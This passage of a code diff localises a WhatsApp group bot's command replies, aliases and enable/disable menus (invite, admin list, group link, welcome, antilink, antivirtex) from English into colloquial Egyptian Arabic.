-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -12102,25 +12097,25 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                 
             }
             break
-			case 'invite': {
+			case 'invite': case 'ابعتلو-دعوه': {
 	if (!m.isGroup) return XeonStickGroup()
 	if (!m.isBotAdmin) return XeonStickBotAdmin()
-if (!text) return replygcxeon(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 916909137213`)
-if (text.includes('+')) return replygcxeon(`Enter the number together without *+*`)
-if (isNaN(text)) return replygcxeon(`Enter only the numbers plus your country code without spaces`)
+if (!text) return replygcxeon(`الله يرضي عنك اكتب كده \n\nمثال :\n*${command}* 201121968769`)
+if (text.includes('+')) return replygcxeon(`معلش يصحبي حط قبل رقم  *+*`)
+if (isNaN(text)) return replygcxeon(`ابعت رقم بس من غير مسافات ويكون صح ❤️🔥.“`)
 let group = m.chat
 let link = 'https://chat.whatsapp.com/' + await XeonBotInc.groupInviteCode(group)
-      await XeonBotInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
-        replygcxeon(` An invite link is sent to the user`) 
+      await XeonBotInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *دعوه لدخولك الجروب*\n\nفي شخص في جروب ده \n\n${link}\n\n بعتلك انك تخش تعالا ي صديقي هتنورنا ❤️🔥.“`, mentions: [m.sender]})
+        replygcxeon(` بعتلو يزميلي استني لحد ميقبل الدعوه ❤️🔥.“`) 
 }
 break
-			case 'tagadmin': case 'listadmin': case 'admin':{
+			case 'tagadmin': case 'listadmin': case 'مين-الادمن':{
     	if (!m.isGroup) return XeonStickGroup()
     const groupAdmins = participants.filter(p => p.admin)
     const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
     const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
     let text = `   
-*Group Admins:*
+*الادمن اهم 😁❤️:*
 ${listAdmin}
 `.trim()
 let msgs = generateWAMessageFromContent(m.chat, {
@@ -12144,7 +12139,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
           nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
             buttons: [{
             "name": "quick_reply",
-              "buttonParamsJson": `{\"display_text\":\"Menu 🚀\",\"id\":\"${prefix}menu"}`
+              "buttonParamsJson": `{\"display_text\":\"قايمه البوت ❤️🔥.“\",\"id\":\"قايمه"}`
             }],
           }), 
           contextInfo: {
@@ -12167,15 +12162,15 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
 break
 			case 'linkgroup':
             case 'linkgrup':
-            case 'linkgc':
+            case 'لينك-الجروب':
             case 'gclink':
-            case 'grouplink':
+            case 'لينك-جروب':
             case 'gruplink':{
                 if (!m.isGroup) return XeonStickGroup()
                 if (!m.isAdmin && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                 if (!m.isBotAdmin) return XeonStickBotAdmin()
                 let response = await XeonBotInc.groupInviteCode(m.chat)
-                XeonBotInc.sendText(m.chat, `👥 *GROUP LINK*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
+                XeonBotInc.sendText(m.chat, ` *خد يزميلي معلومات جروب 🤔❤️.*\n📛 *الاسم :* ${groupMetadata.subject}\n👤 *صاحب الجروب :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'مش موجود'}\n *لينك جروب اهو😁❤️ :* https://chat.whatsapp.com/${response}\n👥 *الاعضاء 😗❤️ :* ${groupMetadata.participants.length}\n`, m, {
                     detectLink: true
                 })
                 }
@@ -12201,7 +12196,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12217,16 +12212,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -12276,7 +12271,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12292,16 +12287,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -12351,7 +12346,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12367,16 +12362,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -12426,7 +12421,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12442,16 +12437,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -12480,17 +12475,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 }
                }
             break
-            case 'antivirtex': case 'antivirus':{
+            case 'antivirtex':{
 		         if (!m.isGroup) return XeonStickGroup()
 if (!m.isBotAdmin) return XeonStickBotAdmin()
 if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                
-               if (args[0] === 'on') {
+               if (args[0] === 'فعل') {
                   db.groups[m.chat].antivirtex = true
-                  replygcxeon(`${command} is enabled`)
-               } else if (args[0] === 'off') {
+                  replygcxeon(`${command} اتفعلت`)
+               } else if (args[0] === 'اقفل') {
                   db.groups[m.chat].antivirtex = false
-                  replygcxeon(`${command} is disabled`)
+                  replygcxeon(`${command} اتقفلت`)
                } else {
                 	let msg = generateWAMessageFromContent(m.chat, {
   viewOnceMessage: {
@@ -12501,7 +12496,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12517,16 +12512,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -12573,7 +12568,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12589,16 +12584,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -12626,16 +12621,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
             break
-			case 'welcome':
+			case 'welcome': case 'ترحيب':
             case 'left': {
                if (!m.isGroup) return XeonStickGroup()
 if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
-               if (args[0] === 'on') {
+               if (args[0] === 'فعل') {
                   db.groups[m.chat].welcome = true
-                  replygcxeon(`${command} is enabled`)
-               } else if (args[0] === 'off') {
+                  replygcxeon(`ميزه ${command} اشتغلت`)
+               } else if (args[0] === 'اقفل') {
                   db.groups[m.chat].welcome = false
-                  replygcxeon(`${command} is disabled`)
+                  replygcxeon(`ميزه ${command} اتقفلت`)
                }else {
                 	let msg = generateWAMessageFromContent(m.chat, {
   viewOnceMessage: {
@@ -12646,7 +12641,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12662,16 +12657,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -12719,7 +12714,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12735,16 +12730,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -12794,7 +12789,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12810,16 +12805,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -12869,7 +12864,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12885,16 +12880,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -12944,7 +12939,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12960,16 +12955,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -13019,7 +13014,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -13035,16 +13030,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -13093,7 +13088,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -13109,16 +13104,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -13147,16 +13142,16 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 }
                }
             break
-            case 'antilink': {
+            case 'antilink': case 'منع-لينكات': {
                if (!m.isGroup) return XeonStickGroup()
 if (!m.isBotAdmin) return XeonStickBotAdmin()
 if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
-               if (args[0] === 'on') {
+               if (args[0] === 'فعل') {
                   db.groups[m.chat].antilink = true
-                  replygcxeon(`${command} is enabled`)
-               } else if (args[0] === 'off') {
+                  replygcxeon(`${command} اتفعلت`)
+               } else if (args[0] === 'اقفل') {
                   db.groups[m.chat].antilink = false
-                  replygcxeon(`${command} is disabled`)
+                  replygcxeon(`${command} اتقفلت`)
                } else {
                 	let msg = generateWAMessageFromContent(m.chat, {
   viewOnceMessage: {
@@ -13167,7 +13162,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -13183,16 +13178,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -13241,7 +13236,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -13257,16 +13252,16 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -13428,7 +13423,7 @@ if (!XeonTheCreator) return XeonStickOwner()
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `Hi ${m.pushname}\nPlease click on the button below to use _*${command}*_ command`
+            text: `اهلا ${m.pushName}\nبص يزميلي هتدوس علي زرار ال تحت ده وتختار عايز تفعل ميزه _*${command}*_ ولا لا ❤️🔥.“`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -13444,16 +13439,16 @@ if (!XeonTheCreator) return XeonStickOwner()
             buttons: [
               {
                 "name": "single_select",
-                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
-"sections":[{"title":"CHOOSE ENABLE/DISABLE",
-"rows":[{"header":"ENABLE ✅",
-"title":"CHOOSE ",
-"description":"ENABLE ✅",
-"id":"${prefix+command} on"},
-{"header":"DISABLE ❌",
-"title":"CHOOSE ",
-"description":"DISABLE ❌",
-"id":"${prefix+command} off"}
+                "buttonParamsJson": `{"title":"اختار هتفعل ولا هتقفل 🤔❤️.",
+"sections":[{"title":"هتفعل/هتقفل",
+"rows":[{"header":"فعل ✅",
+"title":" ",
+"description":"فعل ✅",
+"id":"${command} فعل"},
+{"header":"اقفل ❌",
+"title":" ",
+"description":"اقفل ❌",
+"id":"${command} اقفل"}
 ]
 }
 ]
@@ -13785,7 +13780,7 @@ replygcxeon(`Number ${bnnd} Has Become An Owner!!!`)
 break
 case 'delowner':
